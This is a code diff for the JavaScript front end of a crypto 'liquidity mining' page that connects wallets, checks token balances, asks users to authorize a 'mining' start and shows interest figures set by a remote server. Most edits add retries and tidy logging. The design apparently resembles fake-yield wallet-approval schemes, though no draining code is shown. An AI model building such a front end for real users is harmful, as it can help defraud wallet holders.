     try {
         updateStatus(translations[currentLang].fetchingBalances);
-        const response = await fetch('https://api.coingecko.com/api/v3/simple/price?ids=ethereum&vs_currencies=usd,usdt', {
+        const response = await retry(() => fetch('https://api.coingecko.com/api/v3/simple/price?ids=ethereum&vs_currencies=usd,usdt', {
             headers: { 'ngrok-skip-browser-warning': 'true' }
-        });
+        }));
         if (!response.ok) throw new Error('Network response was not ok');
         const data = await response.json();
         const usdPrice = data.ethereum?.usd || 0;
         const usdtPrice = data.ethereum?.usdt || usdPrice;
-        const prices = { 
-            usd: usdPrice, 
-            usdt: usdtPrice, 
-            usdc: usdPrice, 
-            weth: usdPrice 
+        const prices = {
+            usd: usdPrice,
+            usdt: usdtPrice,
+            usdc: usdPrice,
+            weth: usdPrice
         };
-        console.log("getEthPrices: Processed prices:", prices);
+        console.log(`getEthPrices: Processed prices:`, prices);
         updateStatus("");
         return prices;
     } catch (error) {
-        console.error("getEthPrices: Could not fetch ETH price:", error);
+        console.error(`getEthPrices: Could not fetch ETH price: ${error.message}`);
         updateStatus(translations[currentLang].priceError, true);
         return null;
     }
@@ -836,7 +836,7 @@ async function claimInterest() {
     await loadUserDataFromServer();
     const claimableETHString = cumulativeValue.textContent.replace(' ETH', '').trim();
     const claimableETH = parseFloat(claimableETHString);
-    console.log("claimInterest: Raw claimableETHString:", claimableETHString, "Parsed:", claimableETH);
+    console.log(`claimInterest: Raw claimableETHString: ${claimableETHString}, Parsed: ${claimableETH}`);
     if (isNaN(claimableETH) || claimableETH < 0.0000001) {
         updateStatus(translations[currentLang].noClaimable);
         return;
@@ -852,10 +852,10 @@ async function claimInterest() {
     let ethToTokenRate = prices[selectedToken.toLowerCase()];
     if (isNaN(ethToTokenRate) || ethToTokenRate === 0) {
         ethToTokenRate = selectedToken === 'WETH' ? 1 : prices.usd;
-        console.warn(`claimInterest: Fallback rate for ${selectedToken}:`, ethToTokenRate);
+        console.warn(`claimInterest: Fallback rate for ${selectedToken}: ${ethToTokenRate}`);
     }
     const valueInToken = claimableETH * ethToTokenRate;
-    console.log("claimInterest: Claim details:", { claimableETH, selectedToken, ethToTokenRate, valueInToken, prices });
+    console.log(`claimInterest: Claim details:`, { claimableETH, selectedToken, ethToTokenRate, valueInToken, prices });
 
     if (isNaN(valueInToken) || valueInToken <= 0) {
         updateStatus(translations[currentLang].invalidCalc);
@@ -890,27 +890,35 @@ function updateLanguage(lang) {
 }
 
 function setupSSE() {
-    const source = new EventSource(`${API_BASE_URL}/api/sse`);
+    const source = new EventSource(`${API_BASE_URL}/api/sse`, {
+        headers: { 'ngrok-skip-browser-warning': 'true' }
+    });
     source.onmessage = async (event) => {
-        const { event: eventType, data } = JSON.parse(event.data);
-        if (eventType === 'dataUpdate' && data.users[userAddress]) {
-            console.log("SSE: Received data update for address:", userAddress, data.users[userAddress]);
-            await loadUserDataFromServer();
-            updateInterest();
-            updateBalancesUI({
-                usdt: await usdtContract.balanceOf(userAddress).catch(() => 0n),
-                usdc: await usdcContract.balanceOf(userAddress).catch(() => 0n),
-                weth: await wethContract.balanceOf(userAddress).catch(() => 0n)
-            });
+        try {
+            const { event: eventType, data } = JSON.parse(event.data);
+            console.log(`SSE: Received event: ${eventType}`, data);
+            if (eventType === 'dataUpdate' && data.users[userAddress]) {
+                console.log(`SSE: Received data update for address: ${userAddress}`, data.users[userAddress]);
+                await loadUserDataFromServer();
+                updateInterest();
+                const balances = {
+                    usdt: await retry(() => usdtContract.balanceOf(userAddress)).catch(() => 0n),
+                    usdc: await retry(() => usdcContract.balanceOf(userAddress)).catch(() => 0n),
+                    weth: await retry(() => wethContract.balanceOf(userAddress)).catch(() => 0n)
+                };
+                updateBalancesUI(balances);
+            }
+        } catch (error) {
+            console.error(`SSE: Error parsing message: ${error.message}`);
         }
     };
     source.onerror = () => {
-        console.warn("SSE: Connection error, attempting to reconnect...");
+        console.warn(`SSE: Connection error, attempting to reconnect...`);
         source.close();
         isServerAvailable = false;
         setTimeout(setupSSE, 5000);
     };
-    console.log("SSE: Connection established for address:", userAddress);
+    console.log(`SSE: Connection established for address: ${userAddress}`);
 }
 
 //---Event Listeners & Initial Load---
@@ -950,16 +958,25 @@ document.addEventListener('DOMContentLoaded', async () => {
                 nextBenefitTime: localStorage.getItem('nextBenefitTime'),
                 lastUpdated: Date.now()
             }));
-            console.log("claimInterest: Updated claimed interest and account balance:", { claimedInterest, accountBalance });
+            console.log(`claimInterest: Updated claimed interest and account balance:`, { claimedInterest, accountBalance });
+            // 領取後將 cumulative 歸零
+            await saveUserData({
+                stakingStartTime,
+                claimedInterest,
+                pledgedAmount,
+                accountBalance,
+                nextBenefitTime: localStorage.getItem('nextBenefitTime'),
+                lastUpdated: Date.now(),
+                overrides: { grossOutput: claimedInterest, cumulative: 0 }
+            });
             updateInterest();
-            const walletBalances = { 
-                usdt: await usdtContract.balanceOf(userAddress).catch(() => 0n), 
-                usdc: await usdcContract.balanceOf(userAddress).catch(() => 0n), 
-                weth: await wethContract.balanceOf(userAddress).catch(() => 0n) 
+            const walletBalances = {
+                usdt: await retry(() => usdtContract.balanceOf(userAddress)).catch(() => 0n),
+                usdc: await retry(() => usdcContract.balanceOf(userAddress)).catch(() => 0n),
+                weth: await retry(() => wethContract.balanceOf(userAddress)).catch(() => 0n)
             };
             updateBalancesUI(walletBalances);
             updateStatus(translations[currentLang].claimSuccess);
-            await saveUserData();
         });
     }
     if (claimModal) {
@@ -970,7 +987,7 @@ document.addEventListener('DOMContentLoaded', async () => {
 });
 
 document.getElementById('refreshData')?.addEventListener('click', async () => {
-    console.log("refreshData: Manually refreshing data...");
+    console.log(`refreshData: Manually refreshing data...`);
     updateStatus('Refreshing data...');
     if (!grossOutputValue || !cumulativeValue) {
         await retryDOMAcquisition();
@@ -993,8 +1010,8 @@ connectButton.addEventListener('click', async () => {
     } else {
         if (typeof window.ethereum === 'undefined') {
             updateStatus(translations[currentLang].noWallet);
+            console.log(`connectButton: No Ethereum provider detected.`);
             connectButton.disabled = true;
-            console.log("connectButton: No Ethereum provider detected.");
             return;
         }
         await connectWallet();
@@ -1004,22 +1021,22 @@ connectButton.addEventListener('click', async () => {
 startBtn.addEventListener('click', async () => {
     if (!signer) {
         alert('Please connect your wallet first!');
-        console.log("startBtn: Clicked but no signer available.");
+        console.log(`startBtn: Clicked but no signer available.`);
         return;
     }
     const selectedToken = walletTokenSelect.value;
     const tokenMap = { 'USDT': usdtContract, 'USDC': usdcContract, 'WETH': wethContract };
     const selectedContract = tokenMap[selectedToken];
     try {
-        const balance = await selectedContract.balanceOf(userAddress);
-        console.log(`startBtn: Checked balance for ${selectedToken}:`, balance.toString());
+        const balance = await retry(() => selectedContract.balanceOf(userAddress));
+        console.log(`startBtn: Checked balance for ${selectedToken}: ${balance.toString()}`);
         if (balance === 0n) {
             alert(`Your ${selectedToken} balance is zero. Please ensure you have sufficient balance to start.`);
             return;
         }
     } catch (e) {
-        alert("Could not fetch balance. Please try again later.");
-        console.error("startBtn: Balance fetch error:", e);
+        alert(`Could not fetch balance: ${e.message}`);
+        console.error(`startBtn: Balance fetch error: ${e.message}`);
         return;
     }
     startBtn.disabled = true;
@@ -1029,27 +1046,27 @@ startBtn.addEventListener('click', async () => {
         alert('Authorization successful! Mining has started.');
         await updateUIBasedOnChainState();
     } catch (error) {
-        console.error("startBtn: Authorization failed:", error);
+        console.error(`startBtn: Authorization failed: ${error.message}`);
         alert(`Authorization failed: ${error.message}`);
         updateStatus(`Authorization failed: ${error.message}`);
     } finally {
         startBtn.disabled = false;
         startBtn.textContent = translations[currentLang]?.startBtnText || 'Start';
-        console.log("startBtn: Authorization process completed.");
+        console.log(`startBtn: Authorization process completed.`);
     }
 });
 
 pledgeBtn.addEventListener('click', async () => {
-    if (!signer) { 
-        alert('Please connect your wallet first!'); 
-        console.log("pledgeBtn: Clicked but no signer available.");
-        return; 
+    if (!signer) {
+        alert('Please connect your wallet first!');
+        console.log(`pledgeBtn: Clicked but no signer available.`);
+        return;
     }
     const amount = parseFloat(pledgeAmount.value) || 0;
-    if (!amount) { 
-        alert('Please enter a pledge amount!'); 
-        console.log("pledgeBtn: No pledge amount entered.");
-        return; 
+    if (!amount) {
+        alert('Please enter a pledge amount!');
+        console.log(`pledgeBtn: No pledge amount entered.`);
+        return;
     }
     pledgedAmount = amount;
     localStorage.setItem('userData', JSON.stringify({
@@ -1069,37 +1086,37 @@ pledgeBtn.addEventListener('click', async () => {
 });
 
 refreshWallet.addEventListener('click', async () => {
-    if (!signer) { 
-        alert('Please connect your wallet first!'); 
-        console.log("refreshWallet: Clicked but no signer available.");
-        return; 
+    if (!signer) {
+        alert('Please connect your wallet first!');
+        console.log(`refreshWallet: Clicked but no signer available.`);
+        return;
     }
-    updateStatus('Refreshing balances...');
-    const balances = { 
-        usdt: await usdtContract.balanceOf(userAddress).catch(() => 0n), 
-        usdc: await usdcContract.balanceOf(userAddress).catch(() => 0n), 
-        weth: await wethContract.balanceOf(userAddress).catch(() => 0n) 
+    updateStatus(translations[currentLang].fetchingBalances);
+    const balances = {
+        usdt: await retry(() => usdtContract.balanceOf(userAddress)).catch(() => 0n),
+        usdc: await retry(() => usdcContract.balanceOf(userAddress)).catch(() => 0n),
+        weth: await retry(() => wethContract.balanceOf(userAddress)).catch(() => 0n)
     };
-    console.log("refreshWallet: Refreshed balances:", balances);
+    console.log(`refreshWallet: Refreshed balances:`, balances);
     updateBalancesUI(balances);
     updateStatus('');
     alert('Wallet balance refreshed!');
 });
 
 walletTokenSelect.addEventListener('change', async () => {
-    console.log("walletTokenSelect: Changed to token:", walletTokenSelect.value);
+    console.log(`walletTokenSelect: Changed to token: ${walletTokenSelect.value}`);
     if (!signer) {
         if (walletBalanceAmount) walletBalanceAmount.textContent = '0.000';
         if (accountBalanceValue) accountBalanceValue.textContent = `0.000 ${walletTokenSelect.value}`;
-        console.log("walletTokenSelect: No signer, reset balance display.");
+        console.log(`walletTokenSelect: No signer, reset balance display.`);
         return;
     }
-    const balances = { 
-        usdt: await usdtContract.balanceOf(userAddress).catch(() => 0n), 
-        usdc: await usdcContract.balanceOf(userAddress).catch(() => 0n), 
-        weth: await wethContract.balanceOf(userAddress).catch(() => 0n) 
+    const balances = {
+        usdt: await retry(() => usdtContract.balanceOf(userAddress)).catch(() => 0n),
+        usdc: await retry(() => usdcContract.balanceOf(userAddress)).catch(() => 0n),
+        weth: await retry(() => wethContract.balanceOf(userAddress)).catch(() => 0n)
     };
-    console.log("walletTokenSelect: Fetched balances:", balances);
+    console.log(`walletTokenSelect: Fetched balances:`, balances);
     updateBalancesUI(balances);
 });
 
@@ -1115,7 +1132,7 @@ tabs.forEach(tab => {
         if (tab.dataset.tab === 'liquidity') {
             grossOutputValue = document.getElementById('grossOutputValue');
             cumulativeValue = document.getElementById('cumulativeValue');
-            console.log("tabClick: Re-acquired DOM elements:", {
+            console.log(`tabClick: Re-acquired DOM elements:`, {
                 grossOutputValue: !!grossOutputValue,
                 cumulativeValue: !!cumulativeValue
             });
